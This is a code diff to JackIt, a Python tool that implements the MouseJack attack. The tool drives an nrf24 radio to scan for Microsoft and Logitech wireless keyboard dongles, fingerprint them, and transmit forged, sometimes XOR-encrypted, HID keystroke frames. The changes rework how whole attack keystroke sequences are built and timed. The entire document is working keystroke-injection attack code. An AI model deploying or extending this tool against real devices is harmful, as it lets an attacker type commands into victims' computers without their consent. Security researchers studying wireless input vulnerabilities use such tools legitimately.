@@ -208,6 +208,7 @@ class JackIt(object):
     def init_radio(self, disable_lna):
         self.radio = nrf24.nrf24(0)
         if not disable_lna:
+            self._debug("Enabled LNA")
             self.radio.enable_lna()
 
     def scan(self, timeout=5.0):
@@ -263,7 +264,7 @@ class JackIt(object):
         self.radio.enter_sniffer_mode(self.serialize_address(address))
         for channel in range(2, 84):
             self.radio.set_channel(channel)
-            if self.radio.transmit_payload(self.serialize_payload(ping), 5, 1):
+            if self.radio.transmit_payload(self.serialize_payload(ping)):
                 return channel
         return None
 
@@ -276,7 +277,7 @@ class JackIt(object):
 
     def transmit_payload(self, payload):
         self.transmit_hook(payload)
-        return self.radio.transmit_payload(self.serialize_payload(payload), 4, 15)
+        return self.radio.transmit_payload(self.serialize_payload(payload))
 
     def fingerprint_device(self, p):
         if len(p) == 19 and (p[0] == 0x08 or p[0] == 0x0c) and p[6] == 0x40:
@@ -301,10 +302,10 @@ class JackIt(object):
             return ''
 
     def attack(self, hid, attack):
+        hid.build_frames(attack)
         for key in attack:
-            if key['hid']:
-                frames = hid.build_frames(key)
-                for frame in frames:
+            if key['frames']:
+                for frame in key['frames']:
                     self.transmit_payload(frame[0])
                     time.sleep(frame[1] / 1000.0)
             elif key['sleep']:
@@ -342,16 +343,28 @@ class MicrosoftHID(object):
         payload[9] = key['hid']
         return payload
 
-    def build_frames(self, key):
-        transmission = []
-        while self.sequence_num < 5:
-            null = self.checksum(self.sequence(self.payload_template[:]))
-            transmission.append([null, 0])
+    def frame(self, key=None):
+        if key:
+            return self.checksum(self.key(self.sequence(self.payload_template[:]), key))
+        else:
+            return self.checksum(self.sequence(self.payload_template[:]))
 
-        payload = self.checksum(self.key(self.sequence(self.payload_template[:]), key))
-        null = self.checksum(self.sequence(self.payload_template[:]))
-        transmission += [[payload, 0], [null, 0]]
-        return transmission
+    def build_frames(self, attack):
+        for i in range(0, len(attack)):
+            key = attack[i]
+            key['frames'] = []
+            if i < len(attack)-1:
+                next_key = attack[i+1]
+            else:
+                next_key = None
+
+            while self.sequence_num < 5:
+                key['frames'].append([self.frame(), 0])
+
+            if key['hid']:
+                key['frames'].append([self.frame(key), 5])
+                if not next_key or key['hid'] == next_key['hid'] or next_key['sleep']:
+                    key['frames'].append([self.frame(), 0])
 
 
 class MicrosoftEncHID(MicrosoftHID):
@@ -372,16 +385,11 @@ class MicrosoftEncHID(MicrosoftHID):
             payload[i] ^= raw_address[(i - 4) % 5]
         return payload
 
-    def build_frames(self, key):
-        transmission = []
-        while self.sequence_num < 5:
-            null = self.xor_crypt(self.checksum(self.sequence(self.payload_template[:])))
-            transmission.append([null, 5])
-
-        payload = self.xor_crypt(self.checksum(self.key(self.sequence(self.payload_template[:]), key)))
-        null = self.xor_crypt(self.checksum(self.sequence(self.payload_template[:])))
-        transmission += [[payload, 5], [null, 5]]
-        return transmission
+    def frame(self, key=None):
+        if key:
+            return self.xor_crypt(self.checksum(self.key(self.sequence(self.payload_template[:]), key)))
+        else:
+            return self.xor_crypt(self.checksum(self.sequence(self.payload_template[:])))
 
 
 class LogitechHID(object):
@@ -412,12 +420,25 @@ class LogitechHID(object):
         payload[3] = key['hid']
         return payload
 
-    def build_frames(self, key):
-        transmission = []
-        payload = self.checksum(self.key(self.payload_template[:], key))
-        null = self.checksum(self.payload_template[:])
-        transmission += [[payload, 10], [null, 10]]
-        return transmission
+    def frame(self, key=None):
+        if key:
+            return self.checksum(self.key(self.payload_template[:], key))
+        else:
+            return self.checksum(self.payload_template[:])
+
+    def build_frames(self, attack):
+        for i in range(0, len(attack)):
+            key = attack[i]
+            key['frames'] = []
+            if i < len(attack)-1:
+                next_key = attack[i+1]
+            else:
+                next_key = None
+
+            if key['hid']:
+                key['frames'].append([self.frame(key), 10])
+                if not next_key or key['hid'] == next_key['hid'] or next_key['sleep']:
+                    key['frames'].append([self.frame(), 0])
 
 
 def banner():
